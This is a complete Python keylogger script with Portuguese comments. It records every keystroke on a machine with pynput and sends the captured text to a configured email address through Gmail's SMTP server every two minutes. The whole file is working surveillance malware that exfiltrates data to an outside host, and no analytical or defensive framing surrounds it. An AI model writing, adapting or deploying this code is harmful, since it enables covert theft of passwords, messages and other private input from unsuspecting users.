from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

EMAIL_ORIGEM = " "
EMAIL_DESTINO = " "
SENHA_EMAIL = " " 

#Função que realiza o envio dos que foi capturado pelo keylogger
def envia_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger!"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 534)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar:", e)
    # agenda novo envio
    Timer(120, envia_email).start()


def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    envia_email()
    listener.join()
